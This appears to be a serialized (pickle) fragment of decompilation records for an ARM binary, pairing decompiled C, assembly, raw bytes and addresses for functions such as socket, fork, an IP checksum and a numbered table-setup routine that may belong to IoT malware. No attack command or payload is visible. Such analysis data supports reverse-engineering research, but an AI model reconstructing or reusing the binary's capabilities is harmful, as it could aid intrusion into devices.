e3\n28 01 0b e5\n12 00 00 ea\n58 30 9f e5\n00 30 93 e5\n03 00 a0 e1\n03 10 a0 e3\n00 20 a0 e3\n50 fb ff eb\n00 30 a0 e1\n1c 30 0b e5\n1c 30 1b e5\n02 3b c3 e3\n1c 30 0b e5\n2c 30 9f e5\n00 30 93 e5\n03 00 a0 e1\n04 10 a0 e3\n1c 20 1b e5\n45 fb ff eb\n01 10 a0 e3\n28 11 0b e5\n28 31 1b e5\n03 00 a0 e1\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p502
S'.text:00009c3c\n.text:00009c40\n.text:00009c44\n.text:00009c48\n.text:00009c4c\n.text:00009c50\n.text:00009c54\n.text:00009c58\n.text:00009c5c\n.text:00009c60\n.text:00009c64\n.text:00009c68\n.text:00009c6c\n.text:00009c70\n.text:00009c74\n.text:00009c78\n.text:00009c7c\n.text:00009c80\n.text:00009c84\n.text:00009c88\n.text:00009c8c\n.text:00009c90\n.text:00009c94\n.text:00009c98\n.text:00009c9c\n.text:00009ca0\n.text:00009ca4\n.text:00009ca8\n.text:00009cac\n.text:00009cb0\n.text:00009cb4\n.text:00009cb8\n.text:00009cbc\n.text:00009cc0\n.text:00009cc4\n.text:00009cc8\n.text:00009ccc\n.text:00009cd0\n.text:00009cd4\n.text:00009cd8\n.text:00009cdc\n.text:00009ce0\n.text:00009ce4\n.text:00009ce8\n.text:00009cec\n.text:00009cf0\n.text:00009cf4\n.text:00009cf8\n.text:00009cfc\n.text:00009d00\n.text:00009d04\n.text:00009d08\n.text:00009d0c\n.text:00009d10\n.text:00009d14\n.text:00009d18\n.text:00009d1c\n.text:00009d20\n.text:00009d24\n.text:00009d28\n.text:00009d2c\n.text:00009d30\n.text:00009d34\n.text:00009d38\n.text:00009d3c\n.text:00009d40\n.text:00009d44\n.text:00009d48\n.text:00009d4c\n.text:00009d50\n.text:00009d54\n.text:00009d58\n.text:00009d5c\n.text:00009d60\n.text:00009d64\n.text:00009d68\n.text:00009d6c\n.text:00009d70\n.text:00009d74\n.text:00009d78\n.text:00009d7c\n.text:00009d80\n.text:00009d84\n.text:00009d88\n.text:00009d8c\n.text:00009d90\n.text:00009d94\n.text:00009d98\n.text:00009d9c\n.text:00009da0\n.text:00009da4\n.text:00009da8\n.text:00009dac\n.text:00009db0\n.text:00009db4\n.text:00009db8\n.text:00009dbc\n.text:00009dc0\n.text:00009dc4\n.text:00009dc8\n.text:00009dcc\n.text:00009dd0\n.text:00009dd4\n.text:00009dd8\n.text:00009ddc\n.text:00009de0\n.text:00009de4\n.text:00009de8\n.text:00009dec\n.text:00009df0\n.text:00009df4\n.text:00009df8\n.text:00009dfc\n.text:00009e00\n.text:00009e04\n.text:00009e08\n.text:00009e0c\n.text:00009e10\n.text:00009e14\n.text:00009e18\n.text:00009e1c\n.text:00009e20\n.text:00009e24\n.text:00009e28\n.text:00009e2c\n.text:00009e30\n.text:00009e34\n.text:00009e38\n.text:00009e3c\n.text:00009e40\n.text:00009e44\n.text:00009e48\n.text:00009e4c\n.text:00009e50\n.text:00009e54\n.text:00009e58\n.text:00009e5c\n.text:00009e60\n.text:00009e64\n.text:00009e68\n.text:00009e6c\n.text:00009e70\n.text:00009e74\n.text:00009e78\n.text:00009e7c\n.text:00009e80\n.text:00009e84\n.text:00009e88\n.text:00009e8c\n.text:00009e90\n.text:00009e94\n.text:00009e98\n.text:00009e9c\n.text:00009ea0\n.text:00009ea4\n.text:00009ea8\n.text:00009eac\n.text:00009eb0\n.text:00009eb4\n.text:00009eb8\n.text:00009ebc\n.text:00009ec0\n'
p503
tp504
sS'fork'
p505
(S'\n__stdcall fork()\n'
p506
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000a__pid_t fork(void)\u000a\u000a{\u000a  __pid_t _Var1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008b08. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  _Var1 = (*(code *)PTR_LAB_00014140)();\u000a  return _Var1;\u000a}\u000a\u000a
p507
S'adr r12,0x8b08\nadd r12,r12,#0xb000\nldr pc,[r12,#0x638]!\n'
p508
S'00 c6 8f e2\n0b ca 8c e2\n38 f6 bc e5\n'
p509
S'.plt:00008b00\n.plt:00008b04\n.plt:00008b08\n'
p510
tp511
sS'FUN_0000b974'
p512
(S'\n__stdcall FUN_0000b974()\n'
p513
V\u000avoid FUN_0000b974(byte bParm1)\u000a\u000a{\u000a  FUN_0000babc((uint)bParm1);\u000a  return;\u000a}\u000a\u000a
p514
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x10\ncpy r3,r0\nstrb r3,[r11,#-0x15]\nldrb r3,[r11,#-0x15]\nmov r3,r3, lsl #0x3\ncpy r2,r3\nldr r3,[0xb9bc]\nadd r3,r2,r3\nstr r3,[r11,#-0x10]\nldrb r3,[r11,#-0x15]\ncpy r0,r3\nbl 0x0000babc\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p515
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n10 d0 4d e2\n00 30 a0 e1\n15 30 4b e5\n15 30 5b e5\n83 31 a0 e1\n03 20 a0 e1\n1c 30 9f e5\n03 30 82 e0\n10 30 0b e5\n15 30 5b e5\n03 00 a0 e1\n42 00 00 eb\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p516
S'.text:0000b974\n.text:0000b978\n.text:0000b97c\n.text:0000b980\n.text:0000b984\n.text:0000b988\n.text:0000b98c\n.text:0000b990\n.text:0000b994\n.text:0000b998\n.text:0000b99c\n.text:0000b9a0\n.text:0000b9a4\n.text:0000b9a8\n.text:0000b9ac\n.text:0000b9b0\n.text:0000b9b4\n.text:0000b9b8\n'
p517
tp518
sS'FUN_0000b378'
p519
(S'\n__stdcall FUN_0000b378()\n'
p520
V\u000avoid FUN_0000b378(undefined4 *puParm1,int iParm2)\u000a\u000a{\u000a  undefined uVar1;\u000a  undefined2 uVar2;\u000a  undefined4 uVar3;\u000a  int local_20;\u000a  undefined4 *local_1c;\u000a  \u000a  local_20 = iParm2;\u000a  local_1c = puParm1;\u000a  while (0 < local_20) {\u000a    if (local_20 < 4) {\u000a      if (local_20 < 2) {\u000a        uVar1 = FUN_0000b2a4();\u000a        *(undefined *)local_1c = uVar1;\u000a        local_1c = (undefined4 *)((int)local_1c + 1);\u000a        local_20 = local_20 + -1;\u000a      }\u000a      else {\u000a        uVar2 = FUN_0000b2a4();\u000a        *(undefined2 *)local_1c = uVar2;\u000a        local_1c = (undefined4 *)((int)local_1c + 2);\u000a        local_20 = local_20 + -2;\u000a      }\u000a    }\u000a    else {\u000a      uVar3 = FUN_0000b2a4();\u000a      *local_1c = uVar3;\u000a      local_1c = local_1c + 1;\u000a      local_20 = local_20 + -4;\u000a    }\u000a  }\u000a  return;\u000a}\u000a\u000a
p521
S'cpy r12,sp\nstmdb sp!,{ r4 r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0xc\nstr r0,[r11,#-0x18]\nstr r1,[r11,#-0x1c]\nb 0x0000b438\nldr r3,[r11,#-0x1c]\ncmp r3,#0x3\nble 0x0000b3cc\nldr r4,[r11,#-0x18]\nbl 0x0000b2a4\ncpy r3,r0\nstr r3,[r4,#0x0]\nldr r3,[r11,#-0x18]\nadd r3,r3,#0x4\nstr r3,[r11,#-0x18]\nldr r3,[r11,#-0x1c]\nsub r3,r3,#0x4\nstr r3,[r11,#-0x1c]\nb 0x0000b438\nldr r3,[r11,#-0x1c]\ncmp r3,#0x1\nble 0x0000b40c\nldr r4,[r11,#-0x18]\nbl 0x0000b2a4\ncpy r3,r0\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\nstrh r3,[r4,#0x0]\nldr r3,[r11,#-0x18]\nadd r3,r3,#0x2\nstr r3,[r11,#-0x18]\nldr r3,[r11,#-0x1c]\nsub r3,r3,#0x2\nstr r3,[r11,#-0x1c]\nb 0x0000b438\nbl 0x0000b2a4\ncpy r3,r0\nand r3,r3,#0xff\nldr r2,[r11,#-0x18]\nstrb r3,[r2,#0x0]\nldr r3,[r11,#-0x18]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x18]\nldr r3,[r11,#-0x1c]\nsub r3,r3,#0x1\nstr r3,[r11,#-0x1c]\nldr r3,[r11,#-0x1c]\ncmp r3,#0x0\nbgt 0x0000b394\nsub sp,r11,#0x10\nldmia sp,{ r4 r11 sp lr }\nbx lr\n'
p522
S'0d c0 a0 e1\n10 d8 2d e9\n04 b0 4c e2\n0c d0 4d e2\n18 00 0b e5\n1c 10 0b e5\n28 00 00 ea\n1c 30 1b e5\n03 00 53 e3\n0a 00 00 da\n18 40 1b e5\nbe ff ff eb\n00 30 a0 e1\n00 30 84 e5\n18 30 1b e5\n04 30 83 e2\n18 30 0b e5\n1c 30 1b e5\n04 30 43 e2\n1c 30 0b e5\n1a 00 00 ea\n1c 30 1b e5\n01 00 53 e3\n0c 00 00 da\n18 40 1b e5\nb0 ff ff eb\n00 30 a0 e1\n03 38 a0 e1\n23 38 a0 e1\nb0 30 c4 e1\n18 30 1b e5\n02 30 83 e2\n18 30 0b e5\n1c 30 1b e5\n02 30 43 e2\n1c 30 0b e5\n0a 00 00 ea\na4 ff ff eb\n00 30 a0 e1\nff 30 03 e2\n18 20 1b e5\n00 30 c2 e5\n18 30 1b e5\n01 30 83 e2\n18 30 0b e5\n1c 30 1b e5\n01 30 43 e2\n1c 30 0b e5\n1c 30 1b e5\n00 00 53 e3\nd3 ff ff ca\n10 d0 4b e2\n10 68 9d e8\n1e ff 2f e1\n'
p523
S'.text:0000b378\n.text:0000b37c\n.text:0000b380\n.text:0000b384\n.text:0000b388\n.text:0000b38c\n.text:0000b390\n.text:0000b394\n.text:0000b398\n.text:0000b39c\n.text:0000b3a0\n.text:0000b3a4\n.text:0000b3a8\n.text:0000b3ac\n.text:0000b3b0\n.text:0000b3b4\n.text:0000b3b8\n.text:0000b3bc\n.text:0000b3c0\n.text:0000b3c4\n.text:0000b3c8\n.text:0000b3cc\n.text:0000b3d0\n.text:0000b3d4\n.text:0000b3d8\n.text:0000b3dc\n.text:0000b3e0\n.text:0000b3e4\n.text:0000b3e8\n.text:0000b3ec\n.text:0000b3f0\n.text:0000b3f4\n.text:0000b3f8\n.text:0000b3fc\n.text:0000b400\n.text:0000b404\n.text:0000b408\n.text:0000b40c\n.text:0000b410\n.text:0000b414\n.text:0000b418\n.text:0000b41c\n.text:0000b420\n.text:0000b424\n.text:0000b428\n.text:0000b42c\n.text:0000b430\n.text:0000b434\n.text:0000b438\n.text:0000b43c\n.text:0000b440\n.text:0000b444\n.text:0000b448\n.text:0000b44c\n'
p524
tp525
sS'FUN_0000b730'
p526
(S'\n__stdcall FUN_0000b730()\n'
p527
V\u000avoid FUN_0000b730(void)\u000a\u000a{\u000a  FUN_0000ba2c(4,PTR_DAT_0000b8c8,0xe);\u000a  FUN_0000ba2c(5,PTR_DAT_0000b8cc,0x13);\u000a  FUN_0000ba2c(6,PTR_DAT_0000b8d0,0x17);\u000a  FUN_0000ba2c(7,PTR_DAT_0000b8d4,0x18);\u000a  FUN_0000ba2c(8,PTR_DAT_0000b8d8,0xf);\u000a  FUN_0000ba2c(9,PTR_DAT_0000b8dc,0x16);\u000a  FUN_0000ba2c(10,PTR_DAT_0000b8e0,0xf);\u000a  FUN_0000ba2c(3,PTR_DAT_0000b8e4,0x17);\u000a  FUN_0000ba2c(0xb,PTR_DAT_0000b8e8,6);\u000a  FUN_0000ba2c(0xc,PTR_DAT_0000b8ec,7);\u000a  FUN_0000ba2c(0xd,PTR_DAT_0000b8f0,7);\u000a  FUN_0000ba2c(0xe,PTR_DAT_0000b8f4,3);\u000a  FUN_0000ba2c(0xf,PTR_DAT_0000b8f8,0x27);\u000a  FUN_0000ba2c(0x10,PTR_DAT_0000b8fc,8);\u000a  FUN_0000ba2c(0x11,PTR_DAT_0000b900,8);\u000a  FUN_0000ba2c(0x12,PTR_DAT_0000b904,5);\u000a  FUN_0000ba2c(0x13,PTR_DAT_0000b908,6);\u000a  FUN_0000ba2c(0x14,PTR_DAT_0000b90c,7);\u000a  FUN_0000ba2c(0x15,PTR_DAT_0000b910,4);\u000a  FUN_0000ba2c(0x16,PTR_DAT_0000b914,9);\u000a  FUN_0000ba2c(0x17,PTR_DAT_0000b918,7);\u000a  FUN_0000ba2c(0x18,PTR_DAT_0000b91c,10);\u000a  FUN_0000ba2c(0x19,PTR_DAT_0000b920,0xf);\u000a  FUN_0000ba2c(0x1a,PTR_DAT_0000b924,6);\u000a  return;\u000a}\u000a\u000a
p528
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nmov r0,#0x4\nldr r1,[0xb8c8]\nmov r2,#0xe\nbl 0x0000ba2c\nmov r0,#0x5\nldr r1,[0xb8cc]\nmov r2,#0x13\nbl 0x0000ba2c\nmov r0,#0x6\nldr r1,[0xb8d0]\nmov r2,#0x17\nbl 0x0000ba2c\nmov r0,#0x7\nldr r1,[0xb8d4]\nmov r2,#0x18\nbl 0x0000ba2c\nmov r0,#0x8\nldr r1,[0xb8d8]\nmov r2,#0xf\nbl 0x0000ba2c\nmov r0,#0x9\nldr r1,[0xb8dc]\nmov r2,#0x16\nbl 0x0000ba2c\nmov r0,#0xa\nldr r1,[0xb8e0]\nmov r2,#0xf\nbl 0x0000ba2c\nmov r0,#0x3\nldr r1,[0xb8e4]\nmov r2,#0x17\nbl 0x0000ba2c\nmov r0,#0xb\nldr r1,[0xb8e8]\nmov r2,#0x6\nbl 0x0000ba2c\nmov r0,#0xc\nldr r1,[0xb8ec]\nmov r2,#0x7\nbl 0x0000ba2c\nmov r0,#0xd\nldr r1,[0xb8f0]\nmov r2,#0x7\nbl 0x0000ba2c\nmov r0,#0xe\nldr r1,[0xb8f4]\nmov r2,#0x3\nbl 0x0000ba2c\nmov r0,#0xf\nldr r1,[0xb8f8]\nmov r2,#0x27\nbl 0x0000ba2c\nmov r0,#0x10\nldr r1,[0xb8fc]\nmov r2,#0x8\nbl 0x0000ba2c\nmov r0,#0x11\nldr r1,[0xb900]\nmov r2,#0x8\nbl 0x0000ba2c\nmov r0,#0x12\nldr r1,[0xb904]\nmov r2,#0x5\nbl 0x0000ba2c\nmov r0,#0x13\nldr r1,[0xb908]\nmov r2,#0x6\nbl 0x0000ba2c\nmov r0,#0x14\nldr r1,[0xb90c]\nmov r2,#0x7\nbl 0x0000ba2c\nmov r0,#0x15\nldr r1,[0xb910]\nmov r2,#0x4\nbl 0x0000ba2c\nmov r0,#0x16\nldr r1,[0xb914]\nmov r2,#0x9\nbl 0x0000ba2c\nmov r0,#0x17\nldr r1,[0xb918]\nmov r2,#0x7\nbl 0x0000ba2c\nmov r0,#0x18\nldr r1,[0xb91c]\nmov r2,#0xa\nbl 0x0000ba2c\nmov r0,#0x19\nldr r1,[0xb920]\nmov r2,#0xf\nbl 0x0000ba2c\nmov r0,#0x1a\nldr r1,[0xb924]\nmov r2,#0x6\nbl 0x0000ba2c\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p529
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n04 00 a0 e3\n80 11 9f e5\n0e 20 a0 e3\nb7 00 00 eb\n05 00 a0 e3\n74 11 9f e5\n13 20 a0 e3\nb3 00 00 eb\n06 00 a0 e3\n68 11 9f e5\n17 20 a0 e3\naf 00 00 eb\n07 00 a0 e3\n5c 11 9f e5\n18 20 a0 e3\nab 00 00 eb\n08 00 a0 e3\n50 11 9f e5\n0f 20 a0 e3\na7 00 00 eb\n09 00 a0 e3\n44 11 9f e5\n16 20 a0 e3\na3 00 00 eb\n0a 00 a0 e3\n38 11 9f e5\n0f 20 a0 e3\n9f 00 00 eb\n03 00 a0 e3\n2c 11 9f e5\n17 20 a0 e3\n9b 00 00 eb\n0b 00 a0 e3\n20 11 9f e5\n06 20 a0 e3\n97 00 00 eb\n0c 00 a0 e3\n14 11 9f e5\n07 20 a0 e3\n93 00 00 eb\n0d 00 a0 e3\n08 11 9f e5\n07 20 a0 e3\n8f 00 00 eb\n0e 00 a0 e3\nfc 10 9f e5\n03 20 a0 e3\n8b 00 00 eb\n0f 00 a0 e3\nf0 10 9f e5\n27 20 a0 e3\n87 00 00 eb\n10 00 a0 e3\ne4 10 9f e5\n08 20 a0 e3\n83 00 00 eb\n11 00 a0 e3\nd8 10 9f e5\n08 20 a0 e3\n7f 00 00 eb\n12 00 a0 e3\ncc 10 9f e5\n05 20 a0 e3\n7b 00 00 eb\n13 00 a0 e3\nc0 10 9f e5\n06 20 a0 e3\n77 00 00 eb\n14 00 a0 e3\nb4 10 9f e5\n07 20 a0 e3\n73 00 00 eb\n15 00 a0 e3\na8 10 9f e5\n04 20 a0 e3\n6f 00 00 eb\n16 00 a0 e3\n9c 10 9f e5\n09 20 a0 e3\n6b 00 00 eb\n17 00 a0 e3\n90 10 9f e5\n07 20 a0 e3\n67 00 00 eb\n18 00 a0 e3\n84 10 9f e5\n0a 20 a0 e3\n63 00 00 eb\n19 00 a0 e3\n78 10 9f e5\n0f 20 a0 e3\n5f 00 00 eb\n1a 00 a0 e3\n6c 10 9f e5\n06 20 a0 e3\n5b 00 00 eb\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p530
S'.text:0000b730\n.text:0000b734\n.text:0000b738\n.text:0000b73c\n.text:0000b740\n.text:0000b744\n.text:0000b748\n.text:0000b74c\n.text:0000b750\n.text:0000b754\n.text:0000b758\n.text:0000b75c\n.text:0000b760\n.text:0000b764\n.text:0000b768\n.text:0000b76c\n.text:0000b770\n.text:0000b774\n.text:0000b778\n.text:0000b77c\n.text:0000b780\n.text:0000b784\n.text:0000b788\n.text:0000b78c\n.text:0000b790\n.text:0000b794\n.text:0000b798\n.text:0000b79c\n.text:0000b7a0\n.text:0000b7a4\n.text:0000b7a8\n.text:0000b7ac\n.text:0000b7b0\n.text:0000b7b4\n.text:0000b7b8\n.text:0000b7bc\n.text:0000b7c0\n.text:0000b7c4\n.text:0000b7c8\n.text:0000b7cc\n.text:0000b7d0\n.text:0000b7d4\n.text:0000b7d8\n.text:0000b7dc\n.text:0000b7e0\n.text:0000b7e4\n.text:0000b7e8\n.text:0000b7ec\n.text:0000b7f0\n.text:0000b7f4\n.text:0000b7f8\n.text:0000b7fc\n.text:0000b800\n.text:0000b804\n.text:0000b808\n.text:0000b80c\n.text:0000b810\n.text:0000b814\n.text:0000b818\n.text:0000b81c\n.text:0000b820\n.text:0000b824\n.text:0000b828\n.text:0000b82c\n.text:0000b830\n.text:0000b834\n.text:0000b838\n.text:0000b83c\n.text:0000b840\n.text:0000b844\n.text:0000b848\n.text:0000b84c\n.text:0000b850\n.text:0000b854\n.text:0000b858\n.text:0000b85c\n.text:0000b860\n.text:0000b864\n.text:0000b868\n.text:0000b86c\n.text:0000b870\n.text:0000b874\n.text:0000b878\n.text:0000b87c\n.text:0000b880\n.text:0000b884\n.text:0000b888\n.text:0000b88c\n.text:0000b890\n.text:0000b894\n.text:0000b898\n.text:0000b89c\n.text:0000b8a0\n.text:0000b8a4\n.text:0000b8a8\n.text:0000b8ac\n.text:0000b8b0\n.text:0000b8b4\n.text:0000b8b8\n.text:0000b8bc\n.text:0000b8c0\n.text:0000b8c4\n'
p531
tp532
sS'memcpy'
p533
(S'\n__stdcall memcpy(void * __dest, void * __src, size_t __n)\n'
p534
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid * memcpy(void *__dest,void *__src,size_t __n)\u000a\u000a{\u000a  void *pvVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a0c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pvVar1 = (void *)(*(code *)PTR_LAB_000140ec)();\u000a  return pvVar1;\u000a}\u000a\u000a
p535
S'adr r12,0x8a0c\nadd r12,r12,#0xb000\nldr pc,[r12,#0x6e0]!\n'
p536
S'00 c6 8f e2\n0b ca 8c e2\ne0 f6 bc e5\n'
p537
S'.plt:00008a04\n.plt:00008a08\n.plt:00008a0c\n'
p538
tp539
sS'FUN_00008ccc'
p540
(S'\n__stdcall FUN_00008ccc()\n'
p541
V\u000auint FUN_00008ccc(ushort *puParm1,uint uParm2)\u000a\u000a{\u000a  uint uVar1;\u000a  uint local_1c;\u000a  uint local_18;\u000a  ushort *local_14;\u000a  \u000a  local_1c = 0;\u000a  local_18 = uParm2;\u000a  local_14 = puParm1;\u000a  while (1 < local_18) {\u000a    local_1c = local_1c + (uint)*local_14;\u000a    local_14 = local_14 + 1;\u000a    local_18 = local_18 - 2;\u000a  }\u000a  if (local_18 == 1) {\u000a    local_1c = local_1c + ((uint)*local_14 & 0xff);\u000a  }\u000a  uVar1 = (local_1c >> 0x10) + (local_1c & 0xffff);\u000a  return ~(uVar1 + (uVar1 >> 0x10) & 0xffff) & 0xffff;\u000a}\u000a\u000a
p542
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x10\nstr r0,[r11,#-0x10]\nstr r1,[r11,#-0x14]\nmov r1,#0x0\nstr r1,[r11,#-0x18]\nb 0x00008d1c\nldr r3,[r11,#-0x10]\nldrh r3,[r3,#0x0]\nldr r2,[r11,#-0x18]\nadd r2,r2,r3\nstr r2,[r11,#-0x18]\nldr r3,[r11,#-0x10]\nadd r3,r3,#0x2\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x14]\nsub r3,r3,#0x2\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x14]\ncmp r3,#0x1\nbhi 0x00008cf0\nldr r3,[r11,#-0x14]\ncmp r3,#0x1\nbne 0x00008d4c\nldr r3,[r11,#-0x10]\nldrh r3,[r3,#0x0]\nand r3,r3,#0xff\nldr r1,[r11,#-0x18]\nadd r1,r1,r3\nstr r1,[r11,#-0x18]\nldr r3,[r11,#-0x18]\nmov r2,r3, lsr #0x10\nldr r1,[r11,#-0x18]\nmov r3,r1, lsl #0x10\nmov r3,r3, lsr #0x10\nadd r2,r2,r3\nstr r2,[r11,#-0x18]\nldr r2,[r11,#-0x18]\nmov r3,r2, lsr #0x10\nldr r1,[r11,#-0x18]\nadd r1,r1,r3\nstr r1,[r11,#-0x18]\nldr r2,[r11,#-0x18]\nmov r3,r2, lsl #0x10\nmov r3,r3, lsr #0x10\nmvn r3,r3\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\ncpy r0,r3\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p543
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n10 d0 4d e2\n10 00 0b e5\n14 10 0b e5\n00 10 a0 e3\n18 10 0b e5\n0a 00 00 ea\n10 30 1b e5\nb0 30 d3 e1\n18 20 1b e5\n03 20 82 e0\n18 20 0b e5\n10 30 1b e5\n02 30 83 e2\n10 30 0b e5\n14 30 1b e5\n02 30 43 e2\n14 30 0b e5\n14 30 1b e5\n01 00 53 e3\nf1 ff ff 8a\n14 30 1b e5\n01 00 53 e3\n05 00 00 1a\n10 30 1b e5\nb0 30 d3 e1\nff 30 03 e2\n18 10 1b e5\n03 10 81 e0\n18 10 0b e5\n18 30 1b e5\n23 28 a0 e1\n18 10 1b e5\n01 38 a0 e1\n23 38 a0 e1\n03 20 82 e0\n18 20 0b e5\n18 20 1b e5\n22 38 a0 e1\n18 10 1b e5\n03 10 81 e0\n18 10 0b e5\n18 20 1b e5\n02 38 a0 e1\n23 38 a0 e1\n03 30 e0 e1\n03 38 a0 e1\n23 38 a0 e1\n03 00 a0 e1\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p544
S'.text:00008ccc\n.text:00008cd0\n.text:00008cd4\n.text:00008cd8\n.text:00008cdc\n.text:00008ce0\n.text:00008ce4\n.text:00008ce8\n.text:00008cec\n.text:00008cf0\n.text:00008cf4\n.text:00008cf8\n.text:00008cfc\n.text:00008d00\n.text:00008d04\n.text:00008d08\n.text:00008d0c\n.text:00008d10\n.text:00008d14\n.text:00008d18\n.text:00008d1c\n.text:00008d20\n.text:00008d24\n.text:00008d28\n.text:00008d2c\n.text:00008d30\n.text:00008d34\n.text:00008d38\n.text:00008d3c\n.text:00008d40\n.text:00008d44\n.text:00008d48\n.text:00008d4c\n.text:00008d50\n.text:00008d54\n.text:00008d58\n.text:00008d5c\n.text:00008d60\n.text:00008d64\n.text:00008d68\n.text:00008d6c\n.text:00008d70\n.text:00008d74\n.text:00008d78\n.text:00008d7c\n.text:00008d80\n.text:00008d84\n.text:00008d88\n.text:00008d8c\n.text:00008d90\n.text:00008d94\n.text:00008d98\n.text:00008d9c\n.text:00008da0\n'
p545
tp546
sS'socket'
p547
(S'\n__stdcall socket(int __domain, int __type, int __protocol)\n'
p548
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint socket(int __domain,int __type,int __protocol)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a30. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000140f8)();\u000a  return iVar1;\u000a}\u000a\u000a
p549
S'adr r12,0x8a30\nadd r12,r12,#0xb000\nldr pc,[r12,#0x6c8]!\n'
p550
S'00 c6 8f e2\n0b ca 8c e2\nc8 f6 bc e5\n'
p551
S'.plt:00008a28\n.plt:00008a2c\n.plt:00008a30\n'
p552
tp553
sS'time'
p554
(S'\n__stdcall time(time_t * __timer)\n'
p555
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000atime_t time(time_t *__timer)\u000a\u000a{\u000a  time_t tVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008b38. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  tVar1 = (*(code *)PTR_LAB_00014150)();\u000a  return tVar1;\u000a}\u000a\u000a
p556
S'adr r12,0x8b38\nadd r12,r12,#0xb000\nldr pc,[r12,#0x618]!\n'
p557
S'00 c6 8f e2\n0b ca 8c e2\n18 f6 bc e5\n'
p558
S'.plt:00008b30\n.plt:00008b34\n.plt:00008b38\n'
p559
tp560
sS'getpid'
p561
(S'\n__stdcall getpid()\n'
p562
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000a__pid_t getpid(void)\u000a\u000a{\u000a  __pid_t _Var1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089f4. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  _Var1 = (*(code *)PTR_LAB_000140e4)();\u000a  return _Var1;\u000a}\u000a\u000a
p563
S'adr r12,0x89f4\nadd r12,r12,#0xb000\nldr pc,[r12,#0x6f0]!\n'
p564
S'00 c6 8f e2\n0b ca 8c e2\nf0 f6 bc e5\n'
p565
S'.plt:000089ec\n.plt:000089f0\n.plt:000089f4\n'
p566
tp567
sS'open'
p568
(S'\n__stdcall open(char * __file, int __oflag)\n'
p569
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint open(char *__file,int __oflag,...)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008ba4. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00014174)();\u000a  return iVar1;\u000a}\u000a\u000a
p570
S'adr r12,0x8ba4\nadd r12,r12,#0xb000\nldr pc,[r12,#0x5d0]!\n'
p571
S'00 c6 8f e2\n0b ca 8c e2\nd0 f5 bc e5\n'
p572
S'.plt:00008b9c\n.plt:00008ba0\n.plt:00008ba4\n'
p573
tp574
s.